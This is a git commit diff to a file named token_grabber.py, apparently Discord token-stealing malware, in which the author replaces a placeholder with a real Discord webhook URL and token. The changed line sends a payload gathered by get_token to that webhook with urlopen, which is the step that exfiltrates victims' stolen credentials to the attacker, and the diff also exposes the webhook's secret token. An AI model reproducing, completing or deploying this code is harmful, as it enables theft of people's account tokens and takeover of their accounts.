c7dfc5d4a1c5b77fef63ea5d61e05aaa7579bbff
randoms12312 <107704780+randoms12312@users.noreply.github.com>
2022-06-17 18:09:29 +0200

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/987076397749141524/7sTbEfK6JRFDbr0XFaqQX0x23sRmoxI7nRqASE8D534BIWOcnWjIR2UPAz6iPr4dszoB', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
